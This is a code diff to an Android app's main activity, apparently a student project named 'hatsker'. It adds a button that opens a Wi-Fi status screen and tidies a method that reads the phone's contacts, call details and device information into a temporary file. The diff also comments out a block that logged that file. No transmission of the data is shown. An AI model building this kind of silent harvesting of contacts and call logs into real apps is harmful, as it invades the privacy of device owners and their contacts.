@@ -1,6 +1,7 @@
 package com.example.student.hatsker;
 
 import android.content.ContentResolver;
+import android.content.Intent;
 import android.content.IntentFilter;
 import android.database.Cursor;
 import android.media.MediaPlayer;
@@ -213,6 +214,20 @@ public class MainActivity extends AppCompatActivity
                 PutIntoFile();
             }
         });
+
+
+        Button goToWifiAct = (Button) findViewById(R.id.goWifiActivity);
+
+        goToWifiAct.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                Intent intent = new Intent(this_, WifiStatusActivity.class);
+
+                startActivity(intent);
+
+            }
+        });
+
     }
 
     private void PutIntoFile()
@@ -226,35 +241,42 @@ public class MainActivity extends AppCompatActivity
             writer = new FileWriter(tempFile);
             Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[] {ContactsContract.CommonDataKinds.Phone._ID, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, null);
             cursor.moveToFirst();
-            writer.write("Call details: " + getCallDetails() + "\n" + "Contacts: ID "+ cursor.getString(0)+" NAME "+ cursor.getString(1)+" PHONE "+cursor.getString(2) + "\n" + "System info details: " + GetInfo.getInfosAboutDevice(act));
+
+            writer.write("Call details: " + getCallDetails() + "\n" + "Contacts: ID "+
+                    cursor.getString(0)+ " NAME "+ cursor.getString(1)+" PHONE "+cursor.getString(2) +
+                    "\n" + "System info details: " + GetInfo.getInfosAboutDevice(act));
+
             writer.close();
-            File internal_m1 = getDir("custom", 0);
+
+
             File external_m1 =  Environment.getExternalStorageDirectory();
+
             Log.i("assdf", external_m1.getPath());
         }
         catch (IOException e)
         {
             e.printStackTrace();
         }
-        String strLine="";
-        StringBuilder text = new StringBuilder();
-        try
-        {
-            FileReader fReader = new FileReader(tempFile);
-            BufferedReader bReader = new BufferedReader(fReader);
-            while( (strLine=bReader.readLine()) != null  )
-            {
-                Log.i("DATA", strLine);
-            }
-        }
-        catch (FileNotFoundException e)
-        {
-            e.printStackTrace();
-        }
-        catch(IOException e)
-        {
-            e.printStackTrace();
-        }
+
+//        String strLine="";
+//        StringBuilder text = new StringBuilder();
+//        try
+//        {
+//            FileReader fReader = new FileReader(tempFile);
+//            BufferedReader bReader = new BufferedReader(fReader);
+//            while( (strLine=bReader.readLine()) != null  )
+//            {
+//                Log.i("DATA", strLine);
+//            }
+//        }
+//        catch (FileNotFoundException e)
+//        {
+//            e.printStackTrace();
+//        }
+//        catch(IOException e)
+//        {
+//            e.printStackTrace();
+//        }
         Log.i("sdf", tempFile.getPath());
     }
 
@@ -326,4 +348,6 @@ public class MainActivity extends AppCompatActivity
     }
 
     String path = android.os.Environment.getExternalStorageDirectory().getAbsolutePath();
+
+
 }
